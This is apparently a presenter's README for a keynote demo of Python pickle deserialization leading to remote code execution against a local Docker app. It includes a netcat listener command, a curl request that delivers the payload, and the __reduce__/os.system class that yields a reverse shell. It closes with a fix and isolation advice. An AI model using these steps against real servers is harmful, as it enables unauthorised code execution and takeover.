# Demo: Python pickle deserialization RCE

The payoff: the server calls `pickle.loads()` on data you send it, and that single
call runs your code and hands you a shell. No bug in the usual sense, no CVE. The
"feature" of pickle is that it reconstructs arbitrary objects, and reconstructing
is executing.

## Why it fits the keynote

Developers reach for pickle constantly: caches, sessions, task queues, and ML model
files (`.pkl`, `.pt`). The message lands hard: "there is no safe mode. Deserializing
untrusted data IS running it." Ties naturally to the ML supply-chain angle (malicious
model weights).

## Run it

```bash
# Terminal 1 (host): listener
nc -lvnp 4444

# Terminal 2 (host): start the vulnerable app
cd shell-demos/pickle-rce
docker compose up --build -d

# Terminal 2: craft the malicious pickle (points back at your listener)
LISTENER_HOST=host.docker.internal LISTENER_PORT=4444 python3 make_payload.py
# copy the base64 it prints, then:
curl -s -X POST http://localhost:5000/load -d "data=PASTE_BASE64_HERE"
```

A shell lands in Terminal 1. Run `id` to show code execution as the app.

## The whole trick (show this slide)

```python
class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))
```
During unpickling, Python calls `__reduce__` and executes what it returns. That is
the entire exploit.

## The fix beat

Never unpickle untrusted data. Use a data-only format (JSON), or sign+verify the
blob. Show the same POST failing when the app switches to `json.loads`.

## Notes

- `host.docker.internal:host-gateway` lets the container reach your host listener.
- Keep this on an isolated host; the shell connects back to whatever you set.
